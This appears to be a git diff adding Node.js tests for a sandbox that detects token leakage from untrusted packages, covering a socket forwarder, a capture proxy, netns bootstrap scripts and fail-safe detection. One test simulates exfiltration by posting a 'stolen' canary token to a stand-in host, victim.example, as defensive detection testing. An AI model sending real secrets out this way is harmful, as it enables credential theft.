@@ -491,3 +491,117 @@ test("#6 --require-sandbox fails closed when no OS sandbox wrapper is available"
     (e) => e.code === "SANDBOX_REQUIRED"
   );
 });
+
+// --- netns confinement: forwarder + unix-socket proxy plumbing ---------------
+
+const {
+  startCaptureProxy,
+  startTcpToUnixForwarder,
+  buildNetnsBootstrap,
+  detectNetnsConfinement
+} = require("../src/sandbox");
+
+// The load-bearing plumbing behind netns confinement, exercised on the host
+// loopback (no bwrap/netns needed to prove the pieces): a payload that respects
+// HTTP_PROXY reaches the parent capture proxy THROUGH the TCP→unix forwarder,
+// and its leaked token is still attributed. This is the observation path the
+// netns tier depends on; if it broke, netns runs would go silently blind.
+test("#6 forwarder relays a proxied request across a unix socket into the capture proxy", { skip: process.platform === "win32" }, async () => {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-fwd-"));
+  const sockPath = path.join(dir, "cap.sock");
+  const token = "unix-forward-token-abc123";
+  const proxy = await startCaptureProxy(new Set([token]), { unixPath: sockPath });
+
+  // Forwarder on an ephemeral loopback port → the proxy's unix socket.
+  let ready;
+  const readyP = new Promise((r) => { ready = r; });
+  const fwd = startTcpToUnixForwarder(0, sockPath, () => ready());
+  await readyP;
+  const innerPort = fwd.address().port;
+
+  // A proxy-respecting client posts the token through the forwarder.
+  await proxiedHttpPost(innerPort, "http://victim.example/x", `stolen=${token}`);
+  // Give the async pipe a moment to deliver.
+  await new Promise((r) => setTimeout(r, 150));
+
+  assert.ok(
+    proxy.hits.some((h) => (h.tokensSeen || []).includes(token)),
+    `token not captured through the forwarder: ${JSON.stringify(proxy.hits)}`
+  );
+  fwd.close();
+  await proxy.close();
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+// The parent capture proxy binds BOTH a TCP port and (when asked) a unix
+// socket, and both feed one hits array — so the shared-net and netns tiers can
+// coexist without duplicating capture logic.
+test("#6 capture proxy exposes a unix socket alongside its TCP port when requested", async () => {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-dual-"));
+  const sockPath = path.join(dir, "cap.sock");
+  const proxy = await startCaptureProxy(new Set(["t"]), { unixPath: sockPath });
+  assert.equal(typeof proxy.port, "number");
+  assert.equal(proxy.unixPath, sockPath);
+  assert.equal(fs.existsSync(sockPath), true, "unix socket should be bound on disk");
+  await proxy.close();
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+// The bootstrap is pure string construction, so its shape is asserted directly:
+// it brings up loopback, launches the forwarder, waits for readiness, runs the
+// payload, and holds the forwarder open for the grace window before teardown.
+test("#6 netns bootstrap brings up lo, waits for the forwarder, then runs the payload", () => {
+  const bootstrap = buildNetnsBootstrap({
+    nodeBin: "/usr/bin/node",
+    selfPath: "/repo/src/sandbox.js",
+    innerPort: 18080,
+    sockPath: "/sb/cap.sock",
+    readyFile: "/sb/fw.ready",
+    ipBin: "ip",
+    graceMs: 1000,
+    payloadCmd: "echo PAYLOAD"
+  });
+  assert.match(bootstrap, /'ip' link set lo up/);
+  assert.match(bootstrap, /__forwarder 18080 '\/sb\/cap\.sock' '\/sb\/fw\.ready'/);
+  assert.match(bootstrap, /while \[ ! -f '\/sb\/fw\.ready' \]/);
+  assert.match(bootstrap, /echo PAYLOAD/);
+  // Payload status is preserved and the forwarder is torn down after the grace.
+  assert.match(bootstrap, /__status=\$\?/);
+  assert.match(bootstrap, /sleep 1\n/);
+  assert.match(bootstrap, /kill \$__fw/);
+  assert.match(bootstrap, /exit \$__status/);
+});
+
+// Fail-safe contract: on a host without bwrap+ip, netns confinement reports
+// UNAVAILABLE (null) — the caller then keeps today's shared-net/env-only
+// behavior. This is what keeps an environment that can't prove confinement from
+// ever claiming netConfined:true.
+test("#6 detectNetnsConfinement returns null (safe fallback) when prerequisites are absent", async () => {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-netns-detect-"));
+  const result = await detectNetnsConfinement(dir);
+  const { spawnSync } = require("node:child_process");
+  const hasBwrap = spawnSync("sh", ["-c", "command -v bwrap"]).status === 0;
+  const hasIp = spawnSync("sh", ["-c", "command -v ip"]).status === 0;
+  if (process.platform !== "linux" || !hasBwrap || !hasIp) {
+    assert.equal(result, null, "must be null when bwrap/ip are unavailable or off-Linux");
+  } else {
+    // On a fully-equipped host the self-test decides; either a real descriptor
+    // (self-test passed) or null (couldn't prove it) — never a throw, never a
+    // half-built object.
+    assert.ok(result === null || (typeof result.build === "function" && typeof result.innerPort === "number"));
+  }
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+// The netns tier must never engage the netns path for an INJECTED runner (the
+// test seam), since there is no real payload command to wrap — a canary run
+// with a custom runner stays on the in-process proxy path.
+test("#6 injected-runner canary run does not attempt netns confinement", async () => {
+  const pkgDir = await stagedPackage();
+  const runner = async () => ({ ran: [] });
+  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
+  // Isolation is whatever the base wrapper is (env-only here); crucially not a
+  // half-engaged netns tier.
+  assert.notEqual(result.isolation, "bwrap+netns");
+  fs.rmSync(pkgDir, { recursive: true, force: true });
+});
